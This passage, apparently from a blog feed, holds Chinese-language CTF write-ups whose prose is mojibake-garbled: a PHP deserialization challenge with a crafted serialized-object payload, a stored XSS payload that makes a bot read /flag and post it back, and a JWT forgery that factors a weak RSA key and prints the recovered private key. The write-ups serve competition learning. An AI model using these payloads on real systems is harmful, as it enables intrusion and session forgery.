class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€çœ¼æ‰“ååºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä»£ç é‡Œæœ‰è¯­æ³•é”™è¯¯<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-214146368.png" class=""><br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-214203595.png" class=""><br>é¢˜ç›®ä¹Ÿç»™äº†hintï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ååºåˆ—è¿å°±ä¸ä¼šæ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct()-&gt;__toString</span><br></pre></td></tr></table></figure><br>äº†å› ä¸ºtoStringåæ‰¾ä¸åˆ°è¿›å…¥å…¶ä»–é­”æœ¯æ–¹æ³•çš„æ–¹æ³•äº†ã€‚<br>åœ¨çœ‹æ¥è®¸ä¹…ä»£ç åæˆ‘å‘ç°<code>$user-&gt;passwdord</code>å¯¹ååºåˆ—çš„å˜é‡çš„passwordè¿›è¡Œäº†è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹æ¸¸æˆrootä¼šå‘ç°å…¶æ²¡æœ‰passwordå±æ€§ï¼Œé‚£ä¹ˆç»•è¿‡<code>$user</code>æ˜¯rootç±»çš„è¯å°±å¯ä»¥è§¦å‘åˆ°å…¶<code>__get()</code>æ–¹æ³•äº†ã€‚</p><p>åœ¨è¿›å…¥<code>__get()</code>æ–¹æ³•åå…¶å¯¹valueè¿›è¡Œäº†ä¸€æ¬¡èµ‹å€¼æ“ä½œç„¶åè¾“å‡ºå…¶md5å€¼ã€‚æˆ‘ä»¬è”æƒ³åˆ°é¢˜ç›®çš„hintå«æˆ‘ä»¬ç¯¡æ”¹ï¼Œè¯´åˆ°ç¯¡æ”¹å¯ä»¥æƒ³åˆ°ä½¿ç”¨<code>&amp;</code>æ¥å°†ä¸¤ä¸ªå˜é‡ç»‘åœ¨ä¸€èµ·ã€‚è€Œé¢˜ç›®æœ‰å¯¹valueè¿›è¡Œèµ‹å€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½å°†æŸä¸ªå€¼ä¸valueè¿›è¡Œå…³è”ç„¶ååœ¨æŸä¸ªåœ°æ–¹è¢«è¾“å‡ºå‘¢?</p><p>æˆ‘ä»¬éƒ½çŸ¥é“è™½ç„¶<code>__destruct()</code>å¯ä»¥æµ…æ˜¾çš„ç†è§£ä¸ºååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œä½†å…¶å®é™…å…¶å®æ˜¯åœ¨è¢«æ‘§æ¯æ—¶è§¦å‘ï¼Œå³å¦‚æˆ‘ä»¬åœ¨ååºåˆ—æ—¶æœ‰ç”ŸæˆUserè¿™ä¸ªç±»çš„å®ä¾‹ï¼Œé‚£ä¹ˆåœ¨ä»£ç ç»“æŸæ—¶å°±ä¼šè§¦å‘<code>__destruct()</code>è€Œ<code>__destruct()</code>çš„é€»è¾‘å°±æ˜¯è¾“å‡ºå±æ€§username</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-215331070.png" class="">  <p>é‚£ä¹ˆæˆ‘ä»¬åªè¦å°†rootçš„æŸä¸ªå±æ€§èµ‹å€¼ä¸ºUserçš„å®ä¾‹ï¼Œåœ¨å°†Useré‡Œçš„usernameèµ‹å€¼ä¸ºrooté‡Œçš„valueçš„åœ°å€å³<code>&amp;</code>ä¸å°±å¯ä»¥è¾“å‡ºflagäº†å—ã€‚</p><p>åœ¨çœ‹çœ¼rootçš„ä»£ç å¯ä»¥å‘ç°æˆ‘ä»¬åªèƒ½å°†usernameèµ‹å€¼ä¸ºUserçš„å®ä¾‹å› ä¸ºvalueéœ€è¦è¿›è¡Œå¼±æ¯”è¾ƒã€‚</p><p>payloadå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>=<span class="number">2024</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;value=<span class="number">2024</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username-&gt;username = &amp;<span class="variable">$a</span>-&gt;value;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;i:<span class="number">2024</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;value&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;value&quot;</span>;R:<span class="number">3</span>;&#125;</span><br></pre></td></tr></table></figure><br>è¿™äº›waféƒ½æŒºå¥½ç»•çš„å°±ä¸ç»†è¯´äº†<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-220359543.png" class=""><br>æ¸¸æˆä¹Ÿå¥½ç»•ï¼Œç›´æ¥åœ¨å¤§æ‹¬å·åé¢åŠ æ•°å­—å³å¯åæ­£ä¹Ÿä¸å½±å“ååºåˆ—åŒ–ã€‚</p><p>è¿™é¢˜æ¯”è¾ƒå¯æƒœçš„æ˜¯é˜Ÿå‹æ‰“å‡ºæ¥åï¼Œæ—¶é—´åˆšå¥½åˆ°5ç‚¹</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼é’é¾™ç»„</title>
      <link href="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¶å®æœ¬æ¥æ˜¯ä¸æƒ³å†™è¿™ç¯‡æ–‡ç« çš„ï¼Œå› ä¸ºä¸€ç›´æ²¡æœ‰ç¯å¢ƒå¤ç°ï¼Œä½†æƒ³æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ç½‘é¼çš„é‚£é“xsså§ï¼Œå› ä¸ºå›½å†…ctf-xssæ¯”è¾ƒå°‘ï¼Œæœ¬äººå¯¹xssçš„è®¤çŸ¥ä¹Ÿæ¯”è¾ƒä¸€èˆ¬ã€‚å› ä¸ºæ²¡æœ‰å¤ç°ç¯å¢ƒæ‰€ä»¥ä»¥ä¸‹å¤§å¤šæ˜¯å£è¿°ï¼Œæ¯”èµ›çš„æ—¶å€™å¿˜æˆªå›¾äº†â€¦"><a href="#å…¶å®æœ¬æ¥æ˜¯ä¸æƒ³å†™è¿™ç¯‡æ–‡ç« çš„ï¼Œå› ä¸ºä¸€ç›´æ²¡æœ‰ç¯å¢ƒå¤ç°ï¼Œä½†æƒ³æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ç½‘é¼çš„é‚£é“xsså§ï¼Œå› ä¸ºå›½å†…ctf-xssæ¯”è¾ƒå°‘ï¼Œæœ¬äººå¯¹xssçš„è®¤çŸ¥ä¹Ÿæ¯”è¾ƒä¸€èˆ¬ã€‚å› ä¸ºæ²¡æœ‰å¤ç°ç¯å¢ƒæ‰€ä»¥ä»¥ä¸‹å¤§å¤šæ˜¯å£è¿°ï¼Œæ¯”èµ›çš„æ—¶å€™å¿˜æˆªå›¾äº†â€¦" class="headerlink" title="å…¶å®æœ¬æ¥æ˜¯ä¸æƒ³å†™è¿™ç¯‡æ–‡ç« çš„ï¼Œå› ä¸ºä¸€ç›´æ²¡æœ‰ç¯å¢ƒå¤ç°ï¼Œä½†æƒ³æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ç½‘é¼çš„é‚£é“xsså§ï¼Œå› ä¸ºå›½å†…ctf xssæ¯”è¾ƒå°‘ï¼Œæœ¬äººå¯¹xssçš„è®¤çŸ¥ä¹Ÿæ¯”è¾ƒä¸€èˆ¬ã€‚å› ä¸ºæ²¡æœ‰å¤ç°ç¯å¢ƒæ‰€ä»¥ä»¥ä¸‹å¤§å¤šæ˜¯å£è¿°ï¼Œæ¯”èµ›çš„æ—¶å€™å¿˜æˆªå›¾äº†â€¦"></a>å…¶å®æœ¬æ¥æ˜¯ä¸æƒ³å†™è¿™ç¯‡æ–‡ç« çš„ï¼Œå› ä¸ºä¸€ç›´æ²¡æœ‰ç¯å¢ƒå¤ç°ï¼Œä½†æƒ³æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ç½‘é¼çš„é‚£é“xsså§ï¼Œå› ä¸ºå›½å†…ctf xssæ¯”è¾ƒå°‘ï¼Œæœ¬äººå¯¹xssçš„è®¤çŸ¥ä¹Ÿæ¯”è¾ƒä¸€èˆ¬ã€‚å› ä¸ºæ²¡æœ‰å¤ç°ç¯å¢ƒæ‰€ä»¥ä»¥ä¸‹å¤§å¤šæ˜¯å£è¿°ï¼Œæ¯”èµ›çš„æ—¶å€™å¿˜æˆªå›¾äº†â€¦</h1><h1 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h1><p>é¦–å…ˆéšä¾¿è¾“å…¥è´¦å·å¯†ç ç™»é™†ï¼ŒæœåŠ¡ç«¯ä¼šç»™å‡ºhashè·¯å¾„ï¼Œåˆ°åå°ä¼šå‘ç°å…¶ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„åª<br>ç›´æ¥å‘é€åˆ°ä»»åŠ¡æ ä¸Šï¼Œä¸ºå­˜å‚¨å‹ xss æ¼æ´ã€‚ç»è¿‡å°è¯•å‘ç°ä½¿ç”¨<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>å°±å¯ä»¥è§¦å‘xssã€‚</p><p>è¿™æ—¶æˆ‘å°±æƒ³ç€å…ˆå¤–å¸¦ï¼Œäºæ˜¯å°è¯•äº†å¤šä¸ªå¤–å¸¦çš„payloadç»“æœä¸€ç›´éƒ½ä¸è¡Œï¼Œè¿™æ—¶æˆ‘æ€€ç–‘ï¼Œbotæ˜¯ä¸æ˜¯åªèƒ½å†æœ¬ç«™è®¿é—®ã€‚<br>äºæ˜¯æˆ‘å°±å†™äº†å¦‚ä¸‹payloadæ¥å°è¯•è®©botè¿›è¡Œpostè¯·æ±‚å°†å­—ç¬¦â€aaaâ€å†™å…¥é“ä»»åŠ¡æ ä¸­<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&quot;http://0192d601faa97dffa2890e43bf77feeb.i5nk.dg04.ciihw.cn:46662/content/f4a62598d9e423749687a71a0adab246&quot;</span>, &#123;     <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,     <span class="attr">headers</span>: &#123;         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>     &#125;,     <span class="attr">body</span>: <span class="string">&quot;content=&#x27;aaaa&#x27;&quot;</span> &#125;) .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()) .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));&lt;script&gt;</span><br></pre></td></tr></table></figure><br>ç»“æœä¸è¡Œï¼Œè¿™å°±ç»™æˆ‘æ•´ä¸ä¼šäº†ï¼Œæœ€åå†ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°ï¼Œbotä¸ä¼šè®¿é—®å¸¦httpçš„urlã€‚ã€‚ã€‚ã€‚äºæ˜¯ä¿®æ”¹ä»¥ä¸‹payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&quot;/content/f4a62598d9e423749687a71a0adab246&quot;</span>, &#123;     <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,     <span class="attr">headers</span>: &#123;         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>     &#125;,     <span class="attr">body</span>: <span class="string">&quot;content=&#x27;aaaa&#x27;&quot;</span> &#125;) .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()) .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));&lt;script&gt;</span><br></pre></td></tr></table></figure><br>å°±å‘ç°å…¶æˆåŠŸè¿›è¡Œäº†è®¿é—®å¹¶å†™å…¥å†…å®¹ã€‚è€Œflagå†flagè·¯ç”±ä¸‹ï¼Œæˆ‘ä»¬åªè¦è®©å…¶è®¿é—®/flagå¹¶å°†å…¶å›æ˜¾å†™å…¥é“ä»»åŠ¡æ å³å¯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Flag Data:&quot;</span>, data);<span class="title function_">fetch</span>(<span class="string">&#x27;/content/6dd78abd8072067672645b3429746fcd&#x27;</span>, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;, <span class="attr">body</span>: <span class="string">&quot;content=123&quot;</span> + data &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Response from /content/url:&quot;</span>, result);  &#125;); &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>è¿™é¢˜å› ä¸ºæ²¡æœ‰å¤ç°ç¯å¢ƒå°±ç®€å•å¤ç°ä»¥ä¸‹jwtçš„ç¯èŠ‚å§ï¼Œä¸ªäººè®©æˆ‘jwtç®—è¿™é¢˜çš„éš¾ç‚¹äº†</p><p>é¦–å…ˆpythonçš„jwtæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥å¾—åˆ°å…¬é’¥<strong>rsa_sign2n</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbTFpbiJ9.FW-UjoD_ldtasCm1OJli6JhnTSicnnGDrkapCnJRkBcfo6rxnzu6sldJI321anP4BRHwJZJHWDW_q22KhAqS9HtS_tJGCJG_t5iX6UbED03yFLrZ_yBoYX0Va-ExC9PNF-2zohPjGP0u9wsF-27120zrpO_9PqkCFze_Xys-VflN eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.HDso3-3ZGjO8_J2ziO5Z2UasjqAl6v50-LrCIe-AmeHRrTWPaJco5Kai5u3eyM4kNInKSjn2fCDjhPvP3-QO2b69BpuNKE7uDRVzuuip6N3T-mnrKBbHrbOPWGFdNIOsPxKyhBn9OC4pOQB5mi5pBXVTh_JCuNXf7dm3_nEz-hY6</span><br></pre></td></tr></table></figure><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-120744483.png" class=""><br>è¿™ä¸ªå·¥å…·ä¼šæŠŠå…¬é’¥ç”Ÿæˆåœ¨åŒç›®å½•æ–‡ä»¶å¤¹ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgSSlUMfCzg/ysG4ixoi6NKGuWNnv</span><br><span class="line">IpZZTRNa045eH2xzzY/ZyRwDojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fAN</span><br><span class="line">MNCYRa47xIW0RwZBDSABcGnwu3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502</span><br><span class="line">ZMSv0AxMgN5UMh9FCwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-131827779.png" class="">  </p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¬é’¥æ˜¯å¾ˆçŸ­çš„ï¼Œé‚£ç›´æ¥å¯ä»¥è¿›è¡Œæ‹†åˆ†ã€‚å› ä¸ºæˆ‘æ˜¯webæ‰‹é™¤äº†åœ¨å¤§ä¸€æ—¶åœ¨hgameæ˜¯æ‰“äº†é“RSAçš„é¢˜åé¢å°±å‡ ä¹æ²¡æœ‰æ‰“è¿‡äº†ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šè„šæœ¬<code>RsaCtfTool</code></p><p>è¿˜æœ‰å› ä¸ºè¿™ç§ç¯å¢ƒå®‰å¤šäº†å®¹æ˜“äº§ç”Ÿå†²çªæ‰€ä»¥è¿™æ ·å¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m venv xxxx</span><br><span class="line">cd xxxx/Scripts</span><br><span class="line">./activate</span><br><span class="line"></span><br><span class="line">é€€å‡º </span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><br>ç„¶åä½¿ç”¨ä½¿ç”¨å·¥å…·æ¥è·å¾—ç§é’¥<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RsaCtfTool.py --publickey ./public --private</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD</span><br><span class="line">ojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw</span><br><span class="line">u3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB</span><br><span class="line">AoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW</span><br><span class="line">TcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq</span><br><span class="line">URC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu</span><br><span class="line">SCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK</span><br><span class="line">S7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli</span><br><span class="line">uJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl</span><br><span class="line">bXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN</span><br><span class="line">Hf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i</span><br><span class="line">6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR</span><br><span class="line">tCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc</span><br><span class="line">qSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ</span><br><span class="line">jqta99E=</span><br></pre></td></tr></table></figure><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-131838676.png" class="">  <p>ç„¶åä½¿ç”¨è¿™ä¸ªç½‘ç«™æ¥ä¼ªé€ <a href="https://www.bejson.com/jwt/å³å¯ï¼Œjwt.ioæœ‰ç‚¹éš¾ç”¨">https://www.bejson.com/jwt/å³å¯ï¼Œjwt.ioæœ‰ç‚¹éš¾ç”¨</a><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-132835853.png" class="">  </p>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜2024 wp</title>
      <link href="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
